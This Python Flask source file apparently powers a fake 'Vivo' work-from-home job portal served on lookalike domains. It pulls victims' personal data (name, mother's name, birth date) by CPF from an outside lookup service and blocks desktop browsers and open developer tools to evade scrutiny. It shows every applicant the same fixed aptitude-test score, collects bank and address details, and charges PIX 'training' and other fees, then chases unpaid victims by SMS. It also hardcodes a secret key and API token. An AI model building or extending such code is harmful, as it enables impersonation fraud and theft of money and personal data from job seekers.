import os
from dotenv import load_dotenv

# Carregar variáveis de ambiente do arquivo .env
load_dotenv()

import logging
import requests
from flask import Flask, render_template, request, redirect, jsonify, session, url_for
from functools import wraps
from for4payments import create_payment_api
from facebook_pixel import facebook_pixel_manager
from sms_recovery import sms_recovery
from models import db, RecoveryData

# Create the Flask app
app = Flask(__name__)
app.secret_key = "227b3a78-df2c-4446-85f2-197199446898"

# Configurar banco de dados PostgreSQL
app.config['SQLALCHEMY_DATABASE_URI'] = os.environ.get('DATABASE_URL')
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
app.config['SQLALCHEMY_ENGINE_OPTIONS'] = {
    'pool_recycle': 300,
    'pool_pre_ping': True,
}

# Inicializar banco de dados
db.init_app(app)

# Adicionar middleware para suportar HTTPS através de proxy
from werkzeug.middleware.proxy_fix import ProxyFix
app.wsgi_app = ProxyFix(app.wsgi_app, x_proto=1, x_host=1)

# Configurar CORS para permitir os novos domínios
@app.after_request
def after_request(response):
    # Lista de domínios permitidos
    allowed_origins = [
        'https://vivo-vagasbrasil.com',
        'https://vivo-homeoffice.com',
        'https://app.vivo-homeoffice.com',
        'https://vivoalerta-700f959ef5fa.herokuapp.com',
        'vivo-vagashomeoffice.com',
        'vivo-oportunidades.com',
        'app.vivo-vagashomeoffice.com'

    ]
    
    origin = request.headers.get('Origin')
    if origin in allowed_origins:
        response.headers['Access-Control-Allow-Origin'] = origin
        response.headers['Access-Control-Allow-Methods'] = 'GET, POST, PUT, DELETE, OPTIONS'
        response.headers['Access-Control-Allow-Headers'] = 'Content-Type, Authorization'
        response.headers['Access-Control-Allow-Credentials'] = 'true'
    
    return response

# Configurar variáveis para os pixels do Facebook
for i in range(1, 7):
    pixel_key = f"FACEBOOK_PIXEL_{i}"
    pixel_value = os.environ.get(pixel_key)
    if pixel_value:
        app.config[pixel_key] = pixel_value
        
# Inicializar o gerenciador de pixel do Facebook
with app.app_context():
    facebook_pixel_manager.initialize(app)

# Configurar logging
logging.basicConfig(level=logging.INFO)

# Função simples para verificar se o acesso está autorizado via sessão
def check_access_authorization():
    return session.get('authorized', False)

@app.route('/consultar_cpf/<cpf>')
def consultar_cpf(cpf):
    """Consulta os dados de um CPF na nova API"""
    try:
        # Remove caracteres não numéricos do CPF
        cpf_limpo = ''.join(filter(str.isdigit, cpf))
        
        if len(cpf_limpo) != 11:
            return jsonify({"status": False, "message": "CPF inválido"})
        
        # Constrói a URL da nova API
        url = f"https://consulta.fontesderenda.blog/cpf.php?token=1285fe4s-e931-4071-a848-3fac8273c55a&cpf={cpf_limpo}"
        
        app.logger.info(f"Consultando CPF {cpf_limpo} na nova API")
        
        # Faz a requisição à API
        response = requests.get(url, timeout=10)
        
        app.logger.info(f"Resposta da API: Status {response.status_code}")
        
        if response.status_code == 200:
            data = response.json()
            app.logger.info(f"Dados recebidos da API: {data}")
            
            # Verifica se tem dados válidos
            if data.get("DADOS"):
                dados = data["DADOS"]
                
                nome = dados.get("nome")
                nome_mae = dados.get("nome_mae")
                data_nascimento = dados.get("data_nascimento")
                sexo = dados.get("sexo")
                
                if nome:
                    # Formatar data de nascimento se necessário
                    data_formatada = data_nascimento
                    if data_nascimento and " " in data_nascimento:
                        # Remove a parte de tempo se existir
                        data_formatada = data_nascimento.split(" ")[0]
                        # Converte de YYYY-MM-DD para DD/MM/YYYY
                        try:
                            partes = data_formatada.split("-")
                            if len(partes) == 3:
                                data_formatada = f"{partes[2]}/{partes[1]}/{partes[0]}"
                        except:
                            pass
                    
                    # Retorna no formato compatível com o sistema existente
                    return jsonify({
                        "status": True,
                        "result": {
                            "nome": nome,
                            "cpf": cpf_limpo,
                            "nome_mae": nome_mae,
                            "data_nascimento": data_formatada,
                            "sexo": sexo
                        }
                    })
            
            app.logger.warning(f"CPF {cpf_limpo} não encontrado ou dados inválidos")
            return jsonify({"status": False, "message": "CPF não encontrado"})
        else:
            app.logger.error(f"Erro na API: {response.status_code} - {response.text}")
            return jsonify({"status": False, "message": "Erro na consulta do CPF"})
    
    except Exception as e:
        app.logger.error(f"Erro ao consultar CPF: {str(e)}")
        return jsonify({"status": False, "message": "Erro ao processar a requisição"})

# Chave da API For4Payments (configurada diretamente)
for4payments_key = '227b3a78-df2c-4446-85f2-197199446898'
app.logger.info("Usando chave For4Payments configurada diretamente no código.")

# Obter o domínio para URLs
def get_domain():
    # Verificar se está no Heroku
    heroku_app_name = os.environ.get('HEROKU_APP_NAME')
    if heroku_app_name:
        return f'https://{heroku_app_name}.herokuapp.com'
    # Verificar se está no Replit
    elif os.environ.get('REPLIT_DEPLOYMENT'):
        replit_domain = os.environ.get('REPLIT_DEV_DOMAIN', '')
        return f'https://{replit_domain}'
    elif os.environ.get('REPLIT_DOMAINS'):
        domains = os.environ.get('REPLIT_DOMAINS', '').split(',')
        if domains:
            return f'https://{domains[0]}'
        else:
            return 'http://localhost:5000'
    # Padrão para ambiente local ou outro
    else:
        port = os.environ.get('PORT', 5000)
        return f'http://localhost:{port}'

@app.route('/')
def index():
    # Se o acesso não for autorizado, retorna a página de erro
    acesso = request.args.get('acesso')
    
    # Verifica se estamos em um ambiente de desenvolvimento ou produção
    dev_domains = ['replit.dev', 'replit.com', 'localhost', '127.0.0.1']
    prod_domains = ['herokuapp.com', 'vivo-vagasbrasil.com', 'vivo-vagashomeoffice.com', 'vivo-oportunidades.com', 'app.vivo-vagashomeoffice.com']
    is_dev = any(domain in request.host for domain in dev_domains)
    is_prod = any(domain in request.host for domain in prod_domains)
    
    if acesso == 'autorizado' or is_dev or is_prod:
        session['authorized'] = True
        # Renderizar a página inicial e incluir o script de detecção de dispositivo
        return render_template('index.html')
    else:
        return render_template('error.html')

@app.route('/error')
def show_error():
    """Rota dedicada para mostrar a página de erro"""
    return render_template('error.html')

@app.route('/check-device', methods=['POST'])
def check_device():
    """Endpoint para verificar o dispositivo do usuário e detectar tentativas de inspeção"""
    try:
        # Obter dados do dispositivo enviados pelo cliente
        data = request.json
        
        # Verificar a URL atual que está fazendo a requisição
        referer = request.headers.get('Referer', '')
        is_treinamento_page = '/treinamento' in referer
        
        # Verificar se é um desktop
        is_desktop = data.get('isDesktop', False) if data else False
        
        # Verificar se as ferramentas de desenvolvedor estão abertas
        dev_tools_open = data.get('devToolsOpen', False) if data else False
        
        # Registrar as informações para análise
        app.logger.info(f"Detecção de dispositivo: Desktop={is_desktop}, DevTools={dev_tools_open}, Página de Treinamento={is_treinamento_page}")
        app.logger.info(f"User Agent: {data.get('userAgent', 'Desconhecido') if data else 'Desconhecido'}")
        app.logger.info(f"Referer: {referer}")
        
        # Verificar as condições de autorização
        authorized = False
        
        # Se o acesso já foi explicitamente autorizado pela query string, manter autorização
        if session.get('authorized'):
            authorized = True
            
        # Se for a página de treinamento, permitir acesso independentemente do dispositivo
        if is_treinamento_page:
            authorized = True
            app.logger.info(f"Acesso à página de treinamento permitido para todos os dispositivos.")
        # Se não for a página de treinamento e for desktop, bloquear
        elif is_desktop:
            authorized = False
            app.logger.warning(f"Acesso via desktop detectado. Acesso negado.")
        # Se não for desktop, permitir acesso regular
        elif not is_desktop:
            authorized = True
            app.logger.info(f"Acesso via dispositivo móvel permitido.")
            
        # Se as ferramentas de desenvolvedor estiverem abertas e NÃO for página de treinamento, bloquear
        if dev_tools_open and not is_treinamento_page:
            authorized = False
            app.logger.warning(f"Ferramentas de desenvolvedor detectadas. Acesso negado.")
            
        # Atualizar o status de autorização na sessão
        session['authorized'] = authorized
        
        return jsonify({
            'authorized': authorized,
            'message': 'Verificação de dispositivo concluída'
        })
        
    except Exception as e:
        app.logger.error(f"Erro ao verificar dispositivo: {str(e)}")
        # Em caso de erro, não autorizar
        session['authorized'] = False
        return jsonify({
            'authorized': False,
            'message': 'Erro na verificação de dispositivo'
        }), 400

@app.route('/cadastro')
def cadastro():
    if not session.get('authorized'):
        return render_template('error.html')
    return render_template('cadastro.html')
    
@app.route('/teste-aptidao', methods=['GET', 'POST'])
def teste_aptidao():
    if not session.get('authorized'):
        return render_template('error.html')
    # Se for POST, pegamos as informações do formulário anterior
    if request.method == 'POST':
        nome = request.form.get('nome', 'Candidato')
        cpf = request.form.get('cpf', '123.456.789-10')
        telefone = request.form.get('telefone', '(11) 98765-4321')
        # Salvar na sessão para uso posterior
        session['user_data'] = {
            'nome': nome,
            'cpf': cpf,
            'telefone': telefone
        }
    return render_template('teste_aptidao.html', 
                          nome=session.get('user_data', {}).get('nome', 'Candidato'),
                          cpf=session.get('user_data', {}).get('cpf', '123.456.789-10'))

@app.route('/resultado-teste', methods=['GET', 'POST'])
@app.route('/resultado_teste', methods=['GET', 'POST'])
def resultado_teste():
    try:
        if not session.get('authorized'):
            return render_template('error.html')
        
        # Dados simplificados para evitar sobrecarga no servidor
        nome = session.get('user_data', {}).get('nome', 'Candidato')
        cpf = session.get('user_data', {}).get('cpf', '123.456.789-10')
        
        # Importar datetime para usar no template
        from datetime import datetime
        now = datetime.now()
        
        # Retorno com dados leves e sem processamento pesado
        # Usando método GET para evitar erro H18 na Heroku
        return render_template('resultado_teste.html',
                             nome=nome,
                             cpf=cpf,
                             pontuacao='86',
                             tempo='08:24',
                             now=now)
    except Exception as e:
        app.logger.error(f"Erro ao processar resultado do teste: {str(e)}")
        # Em caso de erro, retornar diretamente para a página de resultado do teste sem processamento
        # Isso evita o erro H18 no Heroku (Server Request Interrupted)
        from datetime import datetime
        now = datetime.now()
        return render_template('resultado_teste.html',
                             nome='Candidato',
                             cpf='123.456.789-10',
                             pontuacao='86',
                             tempo='08:24',
                             now=now)
                          
@app.route('/recebedor', methods=['GET', 'POST'])
def recebedor():
    if not session.get('authorized'):
        return render_template('error.html')
    if request.method == 'POST':
        # Obter os dados do método de recebimento
        metodo_pagamento = request.form.get('metodo_pagamento', 'ted')
        
        # Logging para debug
        print(f"Método de recebimento escolhido: {metodo_pagamento}")
        print(f"Dados do formulário: {request.form}")
        
        # Cartão salário da Vivo como método de pagamento
        if metodo_pagamento == 'cartao_salario':
            # Salvar na sessão
            session['metodo_recebimento'] = {
                'metodo': 'cartao_salario',
                'banco': 'Cartão Salário Vivo',
                'descricao': 'Cartão Salário Vivo em parceria com MasterCard',
                'limite_credito': 'R$ 1.900,00'
            }
            
            print(f"Método cartão salário configurado: {session['metodo_recebimento']}")
        elif metodo_pagamento == 'pix':
            pix_type = request.form.get('pix_type', '')
            pix_key = request.form.get('pix_key', '')
            
            # Salvar na sessão
            session['metodo_recebimento'] = {
                'metodo': 'pix',
                'pix_type': pix_type.upper(),
                'pix_key': pix_key
            }
            
            print(f"Dados PIX salvos na sessão: {session['metodo_recebimento']}")
        else:  # TED
            banco = request.form.get('banco', '')
            agencia = request.form.get('agencia', '')
            conta = request.form.get('conta', '')
            tipo_conta = request.form.get('tipo_conta', 'Conta Corrente')
            
            # Salvar na sessão
            session['metodo_recebimento'] = {
                'metodo': 'ted',
                'banco': banco,
                'agencia': agencia,
                'conta': conta,
                'tipo_conta': tipo_conta
            }
            
            print(f"Dados TED salvos na sessão: {session['metodo_recebimento']}")
        
        # Redirecionar para a próxima página
        return redirect(url_for('plano_saude', **request.args))
        
    # Método GET - exibir formulário
    return render_template('recebedor.html',
                          nome=session.get('user_data', {}).get('nome', 'Candidato'),
                          cpf=session.get('user_data', {}).get('cpf', '123.456.789-10'),
                          email=session.get('user_data', {}).get('email', 'exemplo@email.com'),
                          telefone=session.get('user_data', {}).get('telefone', '11999999999'))

@app.route('/selecao-chip', methods=['GET', 'POST'])
def selecao_chip():
    return render_template('selecao_chip.html',
                          nome=session.get('user_data', {}).get('nome', 'Candidato'),
                          cpf=session.get('user_data', {}).get('cpf', '123.456.789-10'))

@app.route('/plano_saude', methods=['GET', 'POST'])
def plano_saude():
    # Se for POST, capturar o número de telefone escolhido
    if request.method == 'POST':
        numero_escolhido = request.form.get('phone_number', '(11) 98765-4321')
        session['numero_escolhido'] = numero_escolhido
        
    return render_template('plano_saude.html',
                          nome=session.get('user_data', {}).get('nome', 'Candidato'),
                          cpf=session.get('user_data', {}).get('cpf', '123.456.789-10'))

@app.route('/equipamentos')
def equipamentos():
    return render_template('equipamentos.html',
                          nome=session.get('user_data', {}).get('nome', 'Candidato'),
                          cpf=session.get('user_data', {}).get('cpf', '123.456.789-10'))
                          
@app.route('/endereco')
def endereco():
    return render_template('endereco.html',
                          nome=session.get('user_data', {}).get('nome', 'Candidato'),
                          cpf=session.get('user_data', {}).get('cpf', '123.456.789-10'))

@app.route('/salvar_endereco', methods=['POST'])
def salvar_endereco():
    # Obter o CEP (usando o valor limpo se disponível)
    cep = request.form.get('cep_clean', request.form.get('cep', ''))
    
    # Salvar os dados do endereço na sessão
    endereco_data = {
        'cep': cep,
        'logradouro': request.form.get('logradouro', ''),
        'numero': request.form.get('numero', ''),
        'complemento': request.form.get('complemento', ''),
        'bairro': request.form.get('bairro', ''),
        'cidade': request.form.get('cidade', ''),
        'estado': request.form.get('estado', ''),
        'referencia': request.form.get('referencia', '')
    }
    
    # Armazenar na sessão
    session['endereco_data'] = endereco_data
    
    # Redirecionar para a tela de carregamento usando url_for
    return redirect(url_for('carregando_curso', **request.args))

@app.route('/curso')
def curso():
    return render_template('curso.html',
                          nome=session.get('user_data', {}).get('nome', 'Candidato'),
                          cpf=session.get('user_data', {}).get('cpf', '123.456.789-10'))
                          
@app.route('/treinamento')
def treinamento():
    # Permitir acesso à página de treinamento sem verificação de autorização
    # Esta é uma rota específica que deve estar acessível mesmo sem autorização prévia
    return render_template('treinamento.html',
                          nome=session.get('user_data', {}).get('nome', 'Candidato'),
                          cpf=session.get('user_data', {}).get('cpf', '123.456.789-10'))
                          
@app.route('/finalizar')
def finalizar():
    # Adicionar data atual para o contrato
    from datetime import datetime, timedelta
    now = datetime.now()
    
    # Calcular data do primeiro salário (30 dias após o cadastro)
    data_primeiro_salario = now + timedelta(days=30)
    data_primeiro_salario_formatada = data_primeiro_salario.strftime('%d/%m/%Y')
    
    # Obter dados de recebimento da sessão, se existirem
    metodo_recebimento = session.get('metodo_recebimento', {})
    
    # Se não houver dados de recebimento na sessão, criar dados de demonstração
    if not metodo_recebimento:
        # Verificar se temos informação do CPF para usar como chave PIX
        cpf_usuario = session.get('user_data', {}).get('cpf', '')
        if cpf_usuario:
            metodo_recebimento = {
                'metodo': 'pix',
                'pix_type': 'CPF',
                'pix_key': cpf_usuario
            }
        else:
            # Dados bancários como alternativa
            metodo_recebimento = {
                'metodo': 'ted',
                'banco': 'Banco do Brasil',
                'agencia': '1234',
                'conta': '56789-0',
                'tipo_conta': 'Conta Corrente'
            }
    
    # Armazenar na sessão para acesso no template
    session['metodo_recebimento'] = metodo_recebimento
    
    return render_template('finalizar.html',
                          nome=session.get('user_data', {}).get('nome', 'Candidato'),
                          cpf=session.get('user_data', {}).get('cpf', '123.456.789-10'),
                          now=now,
                          data_primeiro_salario=data_primeiro_salario_formatada,
                          metodo_recebimento=metodo_recebimento)

@app.route('/transacao')
def transacao():
    """Rota para a página de transação de treinamento - R$ 79,90"""
    if not check_access_authorization():
        return render_template('error.html')
    
    # Verificar se já existe uma transação de treinamento na sessão
    training_payment_data = session.get('training_payment_data', {})
    
    # Se não existe transação de treinamento, criar uma nova
    if not training_payment_data.get('transaction_id'):
        try:
            # Importar for4payments2 para usar a API de treinamento
            from for4payments2 import create_payment2_api
            
            # Criar a instância da API
            payment_api = create_payment2_api()
            
            # Gerar transação PIX fixa de R$ 79,90
            payment_result = payment_api.create_fixed_transaction_payment()
            
            # Armazenar dados de pagamento de treinamento na sessão
            session['training_payment_data'] = {
                'pix_code': payment_result.get('pixCode'),
                'pix_qr_code': payment_result.get('pixQrCode'),
                'transaction_id': payment_result.get('id'),
                'expires_at': payment_result.get('expiresAt'),
                'value': 79.90
            }
            
            # Atualizar dados locais
            training_payment_data = session['training_payment_data']
            
            app.logger.info(f"Nova transação PIX de treinamento criada: {payment_result.get('id')} - R$ 79,90")
            
        except Exception as e:
            app.logger.error(f"Erro ao criar transação PIX de treinamento: {str(e)}")
            # Usar dados de fallback se a API falhar
            training_payment_data = {
                'pix_code': '',
                'pix_qr_code': '',
                'transaction_id': '',
                'expires_at': '',
                'value': 79.90
            }
    
    # Obter dados do usuário
    user_data = session.get('user_data', {})
    nome = user_data.get('nome', 'Candidato')
    cpf = user_data.get('cpf', '123.456.789-10')
    telefone = user_data.get('telefone', '11999999999')
    
    # Renderizar a página de transação com os dados do PIX de treinamento
    return render_template('transacao.html',
                          nome=nome,
                          cpf=cpf,
                          telefone=telefone,
                          pix_code=training_payment_data.get('pix_code', ''),
                          pix_qr_code=training_payment_data.get('pix_qr_code', ''),
                          transaction_id=training_payment_data.get('transaction_id', ''),
                          valor=79.90)

@app.route('/carregando_transacao')
def carregando_transacao():
    """Tela de carregamento para processamento da transação"""
    # Limpar dados de pagamento antigos para forçar nova transação
    if 'payment_data' in session:
        del session['payment_data']
    
    return render_template('carregando.html', redirect_url='/pagamento', tipo='pagamento')

@app.route('/processo_transacao')
def processo_transacao():
    """Processa a transação PIX de R$ 59,90 e redireciona para a página de pagamento"""
    if not check_access_authorization():
        return render_template('error.html')
    
    try:
        # Obter dados do usuário da sessão
        user_data = session.get('user_data', {})
        nome = user_data.get('nome', 'Candidato')
        cpf = user_data.get('cpf', '123.456.789-10')
        telefone = user_data.get('telefone', '11987654321')
        cidade = session.get('endereco', {}).get('cidade', 'São Paulo')
        estado = session.get('endereco', {}).get('estado', 'SP')
        cep = session.get('endereco', {}).get('cep', '01000-000')
        
        # Limpar dados de pagamento anteriores da sessão
        if 'payment_data' in session:
            del session['payment_data']
        
        # Redirecionar para a página de pagamento
        return redirect(url_for('pagamento'))
            
    except Exception as e:
        app.logger.error(f"Erro ao processar transação: {str(e)}")
        return render_template('error.html', message="Erro ao processar transação. Por favor, tente novamente.")

# Rota para mostrar o carregamento antes de ir para Pagamento
@app.route('/carregando_pagamento')
def carregando_pagamento():
    return render_template('carregando.html', redirect_url='/pagamento', tipo='pagamento')

# Rota para mostrar o carregamento antes de ir para Cadastro
@app.route('/carregando_cadastro')
def carregando_cadastro():
    return render_template('carregando.html', redirect_url='/cadastro', tipo='cadastro')

# Rota para mostrar o carregamento antes de ir para Recebedor
@app.route('/carregando_recebedor')
def carregando_recebedor():
    return render_template('carregando.html', redirect_url='/recebedor', tipo='recebedor')

# Rota para mostrar o carregamento antes de ir para Plano
@app.route('/carregando_plano')
def carregando_plano():
    return render_template('carregando.html', redirect_url='/plano_saude', tipo='plano')

# Rota para mostrar o carregamento antes de ir para Equipamentos
@app.route('/carregando_equipamentos')
def carregando_equipamentos():
    return render_template('carregando.html', redirect_url='/equipamentos', tipo='equipamentos')

# Rota para mostrar o carregamento antes de ir para Endereço
@app.route('/carregando_endereco')
def carregando_endereco():
    return render_template('carregando.html', redirect_url='/endereco', tipo='endereco')

# Rota para mostrar o carregamento antes de ir para Curso
@app.route('/carregando_curso')
def carregando_curso():
    return render_template('carregando.html', redirect_url='/curso', tipo='curso')

# Rota para mostrar o carregamento antes de ir para Finalizar
@app.route('/carregando_finalizar')
def carregando_finalizar():
    return render_template('carregando.html', redirect_url='/finalizar', tipo='finalizar')

@app.route('/carregando_treinamento')
def carregando_treinamento():
    """Tela de carregamento para processamento da transação de treinamento"""
    # Limpar dados de pagamento antigos para forçar nova transação
    if 'training_payment_data' in session:
        del session['training_payment_data']
    
    return render_template('carregando.html', redirect_url='/transacao', tipo='treinamento')
                          
@app.route('/pagamento', methods=['GET', 'POST'])
def pagamento():
    # Verificar autorização de acesso
    if not check_access_authorization():
        return render_template('error.html')
        
    try:
        # Obter dados do usuário da sessão
        user_data = session.get('user_data', {})
        nome = user_data.get('nome', 'Candidato')
        cpf = user_data.get('cpf', '123.456.789-10')
        email = user_data.get('email', 'exemplo@email.com')
        telefone = user_data.get('telefone', '11999999999')
        
        # Verificar se já existe uma transação PIX na sessão
        payment_data = session.get('payment_data', {})
        
        # Se não existe transação PIX ou se a transação expirou, criar uma nova
        if not payment_data.get('transaction_id') or not payment_data.get('expires_at'):
            app.logger.info("Criando nova transação PIX...")
            
            # Inicializar a API
            payment_api = create_payment_api()
            
            # Preparar dados do usuário
            endereco_data = session.get('endereco_data', {})
            payment_user_data = {
                'nome': nome,
                'cpf': cpf.replace('.', '').replace('-', ''),
                'telefone': telefone,
                'cidade': endereco_data.get('cidade', 'São Paulo'),
                'estado': endereco_data.get('estado', 'SP'),
                'cep': endereco_data.get('cep', '01000-000')
            }
            
            # Gerar transação PIX
            payment_result = payment_api.create_vivo_payment(payment_user_data)
            
            if not payment_result or not payment_result.get('id'):
                app.logger.error("Falha ao gerar transação PIX: Resposta inválida da API")
                return render_template('error.html', message="Erro ao gerar pagamento. Por favor, tente novamente.")
            
            # Armazenar dados de pagamento na sessão
            session['payment_data'] = {
                'pix_code': payment_result.get('pixCode'),
                'pix_qr_code': payment_result.get('pixQrCode'),
                'transaction_id': payment_result.get('id'),
                'expires_at': payment_result.get('expiresAt')
            }
            
            # Atualizar dados locais
            payment_data = session['payment_data']
            
            app.logger.info(f"Nova transação PIX criada: {payment_result.get('id')}")
            
            # Enviar SMS de recuperação
            try:
                from sms_recovery import SMSRecoveryAPI
                sms_api = SMSRecoveryAPI()
                sms_result = sms_api.send_recovery_sms(
                    user_data=payment_user_data,
                    transaction_id=payment_result.get('id', ''),
                    pix_data=payment_result
                )
                app.logger.info(f"SMS de recuperação enviado: {sms_result}")
            except Exception as sms_error:
                app.logger.warning(f"Erro ao enviar SMS de recuperação: {str(sms_error)}")
        
        # Verificar se temos os dados necessários do PIX
        if not payment_data.get('pix_code') or not payment_data.get('pix_qr_code'):
            app.logger.error("Dados do PIX incompletos na sessão")
            return render_template('error.html', message="Erro ao gerar pagamento. Por favor, tente novamente.")
        
        # Obter dados de endereço da sessão
        endereco_data = session.get('endereco_data', {})
        logradouro = endereco_data.get('logradouro', '')
        numero = endereco_data.get('numero', '')
        complemento = endereco_data.get('complemento', '')
        bairro = endereco_data.get('bairro', '')
        cidade = endereco_data.get('cidade', '')
        estado = endereco_data.get('estado', '')
        cep = endereco_data.get('cep', '')
        
        # Formatar endereço completo para exibição
        endereco_completo = f"{logradouro}, {numero}" if logradouro and numero else "Endereço não informado"
        
        # Retornar a página de pagamento com os dados do PIX e endereço
        return render_template('pagamento.html',
                            nome=nome,
                            cpf=cpf,
                            email=email,
                            telefone=telefone,
                            endereco=endereco_completo,
                            complemento=complemento,
                            bairro=bairro,
                            cidade=cidade,
                            uf=estado,
                            cep=cep,
                            pix_code=payment_data.get('pix_code', ''),
                            pix_qr_code=payment_data.get('pix_qr_code', ''),
                            transaction_id=payment_data.get('transaction_id', ''))
                            
    except Exception as e:
        app.logger.error(f"Erro ao processar página de pagamento: {str(e)}")
        return render_template('error.html', message="Erro ao processar pagamento. Por favor, tente novamente.")

@app.route('/vivo')
def vivo():
    # Obter parâmetros da URL
    telefone = request.args.get('telefone', '11987654321')
    nome = request.args.get('nome', 'Roberto Carlos da Silva')
    cpf = request.args.get('cpf', '12345678910')
    
    # Formatar nome (se estiver em caixa alta, converter para título)
    if nome == nome.upper():
        # Converter para formato de título (primeira letra de cada palavra em maiúsculo)
        nome = ' '.join(word.capitalize() for word in nome.lower().split())
    
    # Formatar CPF: 000.000.000-00
    if len(cpf) == 11:
        cpf_formatado = f"{cpf[0:3]}.{cpf[3:6]}.{cpf[6:9]}-{cpf[9:11]}"
    else:
        cpf_formatado = cpf
    
    # Formatar telefone: (11) 98765-4321
    if len(telefone) >= 10:
        if len(telefone) == 10:  # Telefone fixo
            telefone_formatado = f"({telefone[0:2]}) {telefone[2:6]}-{telefone[6:10]}"
        else:  # Celular
            telefone_formatado = f"({telefone[0:2]}) {telefone[2:7]}-{telefone[7:11]}"
    else:
        telefone_formatado = telefone
    
    return render_template('index.html', 
                          nome=nome, 
                          telefone=telefone_formatado, 
                          cpf=cpf_formatado)

@app.route('/create-checkout-session', methods=['POST'])
def create_checkout_session():
    try:
        # Obter parâmetros do formulário
        telefone = request.form.get('telefone')
        nome = request.form.get('nome')
        cpf = request.form.get('cpf')
        
        # Formatar nome (se estiver em caixa alta, converter para título)
        if nome and nome == nome.upper():
            # Converter para formato de título (primeira letra de cada palavra em maiúsculo)
            nome = ' '.join(word.capitalize() for word in nome.lower().split())
        
        # Obter valores padrão se necessário
        if not telefone:
            telefone = request.args.get('telefone', '11987654321')
        
        if not nome:
            nome = request.args.get('nome', 'Roberto Carlos da Silva')
            
        if not cpf:
            cpf = request.args.get('cpf', '12345678910')
            
        # Formatar telefone
        if telefone:
            if len(telefone) >= 10:
                if len(telefone) == 10:  # Telefone fixo
                    telefone_formatado = f"({telefone[0:2]}) {telefone[2:6]}-{telefone[6:10]}"
                else:  # Celular
                    telefone_formatado = f"({telefone[0:2]}) {telefone[2:7]}-{telefone[7:11]}"
            else:
                telefone_formatado = telefone
        else:
            telefone_formatado = "(11) 98765-4321"
        
        # Formatar CPF
        if cpf and len(cpf) == 11:
            cpf_formatado = f"{cpf[0:3]}.{cpf[3:6]}.{cpf[6:9]}-{cpf[9:11]}"
        else:
            cpf_formatado = cpf if cpf else '123.456.789-10'
            
        # Salvar dados na sessão para uso na página de pagamento
        session['user_data'] = {
            'nome': nome,
            'telefone': telefone,
            'cpf': cpf,
            'telefone_formatado': telefone_formatado,
            'cpf_formatado': cpf_formatado
        }
        
        # Limpar dados de pagamento anteriores da sessão
        if 'payment_data' in session:
            del session['payment_data']
        
        # Redirecionar para a página de pagamento
        return redirect(url_for('pagamento'))
            
    except Exception as e:
        app.logger.error(f"Erro no checkout: {str(e)}")
        return render_template('error.html', message="Erro ao processar checkout. Por favor, tente novamente.")

@app.route('/success')
def success():
    # Obter parâmetros da URL (se existirem) ou usar valores padrão
    telefone = request.args.get('telefone')
    nome = request.args.get('nome', 'Roberto Carlos da Silva')
    cpf = request.args.get('cpf', '12345678910')
    
    # Formatar nome (se estiver em caixa alta, converter para título)
    if nome == nome.upper():
        # Converter para formato de título (primeira letra de cada palavra em maiúsculo)
        nome = ' '.join(word.capitalize() for word in nome.lower().split())
    
    # Formatar CPF: 000.000.000-00
    if cpf and len(cpf) == 11:
        cpf_formatado = f"{cpf[0:3]}.{cpf[3:6]}.{cpf[6:9]}-{cpf[9:11]}"
    else:
        cpf_formatado = cpf if cpf else '123.456.789-10'
    
    # Formatar telefone: (11) 98765-4321
    if telefone and len(telefone) >= 10:
        if len(telefone) == 10:  # Telefone fixo
            telefone_formatado = f"({telefone[0:2]}) {telefone[2:6]}-{telefone[6:10]}"
        else:  # Celular
            telefone_formatado = f"({telefone[0:2]}) {telefone[2:7]}-{telefone[7:11]}"
    else:
        telefone_formatado = telefone if telefone else '(11) 98765-4321'
    
    return render_template('success.html', 
                           nome=nome, 
                           telefone=telefone_formatado, 
                           cpf=cpf_formatado)

@app.route('/cancel')
def cancel():
    return render_template('cancel.html')
    
@app.route('/carteira-digital')
def carteira_digital():
    if not session.get('authorized'):
        return render_template('error.html')
    # Obter parâmetros de sessão ou definir valores padrão
    nome = session.get('user_data', {}).get('nome', 'Candidato')
    cpf = session.get('user_data', {}).get('cpf', '')
    telefone = session.get('user_data', {}).get('telefone', '')
    
    return render_template('carteira_digital.html',
                          nome=nome,
                          cpf=cpf,
                          telefone=telefone)
    
@app.route('/carteira-digital-acesso')
def carteira_digital_acesso():
    if not session.get('authorized'):
        return render_template('error.html')
    # Obter parâmetros de sessão ou definir valores padrão
    nome = session.get('user_data', {}).get('nome', 'Candidato')
    cpf = session.get('user_data', {}).get('cpf', '')
    telefone = session.get('user_data', {}).get('telefone', '')
    
    return render_template('carteira_digital_acesso_simples.html',
                          nome=nome,
                          cpf=cpf,
                          telefone=telefone)

@app.route('/generate-pix', methods=['POST'])
def generate_pix():
    try:
        # Obter parâmetros do formulário
        telefone = request.form.get('telefone')
        nome = request.form.get('nome')
        cpf = request.form.get('cpf')
        
        # Formatar nome (se estiver em caixa alta, converter para título)
        if nome and nome == nome.upper():
            # Converter para formato de título (primeira letra de cada palavra em maiúsculo)
            nome = ' '.join(word.capitalize() for word in nome.lower().split())
        
        # Criar pagamento PIX através da API For4Payments
        payment_api = create_payment_api()
        
        # Criar o pagamento
        user_data = {
            'nome': nome,
            'telefone': telefone,
            'cpf': cpf
        }
        
        payment_result = payment_api.create_vivo_payment(user_data)
        
        # Adicionar os dados de pagamento à sessão
        session['payment_data'] = {
            'pix_code': payment_result.get('pixCode'),
            'pix_qr_code': payment_result.get('pixQrCode'),
            'transaction_id': payment_result.get('id'),
            'expires_at': payment_result.get('expiresAt')
        }
        
        # Salvar dados do usuário para recuperação via SMS
        session['user_data'] = {
            'nome': nome,
            'telefone': telefone,
            'cpf': cpf,
            'cidade': session.get('user_data', {}).get('cidade', 'São Paulo'),
            'pix_code': payment_result.get('pixCode')  # Salvar código PIX para usar na recuperação
        }
        
        # Retornar os dados do PIX em formato JSON
        return jsonify({
            'success': True,
            'pix_code': payment_result.get('pixCode'),
            'pix_qr_code': payment_result.get('pixQrCode')
        })
            
    except Exception as e:
        app.logger.error(f"Erro ao gerar PIX: {str(e)}")
        return jsonify({
            'success': False,
            'error': str(e)
        }), 500

@app.route('/vaga')
def vaga():
    """Rota para a página de recuperação de vendas com chat personalizado"""
    # Sempre autorizar acesso a esta página para fins de recuperação de vendas
    session['authorized'] = True
    
    # Obter parâmetros de sessão ou definir valores padrão
    nome = session.get('user_data', {}).get('nome', 'Candidato')
    cpf = session.get('user_data', {}).get('cpf', '')
    telefone = session.get('user_data', {}).get('telefone', '')
    cidade = session.get('user_data', {}).get('cidade', 'São Paulo')
    
    return render_template('vaga.html',
                          nome=nome,
                          cpf=cpf,
                          telefone=telefone,
                          cidade=cidade)

